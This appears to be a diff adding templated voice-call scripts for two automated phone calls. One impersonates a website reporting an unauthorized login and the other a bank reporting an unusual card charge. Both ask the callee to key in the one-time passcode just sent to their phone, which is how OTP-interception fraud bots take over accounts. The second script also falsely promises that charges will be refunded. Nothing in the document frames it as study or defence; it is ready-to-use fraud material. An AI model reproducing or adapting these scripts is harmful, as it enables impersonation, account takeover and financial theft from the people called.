@@ -1,0 +1,23 @@
+voice1.py
+
+Hello, This is an emergency alert from {site}, if this is, {name} , please press 1, otherwise, please hang up.
+
+An unauthorized login has been detected on your {site} account. if this was not you, to secure your {site} account., please input the., {digit} ,. one time pass code we have sent to your mobile phone now.
+
+Thank you, Your {site} Account is now secure, Good bye.
+
+
+
+
+
+
+
+voice2.py : 
+
+Hello, This is {bank} calling about an unusual charge on your credit or debit card. If this is, {name}, please press 1, otherwise, please hang up.
+
+An unusual transaction in the amount of {amt} has been attempted on your card ending in {last4}, if this was not you, to block this transaction and secure your account please enter the 6 digit one time passcode we have sent to your mobile phone now.
+
+Thank you, Your account is now secure, Any transactions shown on your account will be reversed and refunded, it will take up to 24 hours to process and show in your account. No further action is needed. Good bye. 
+
+
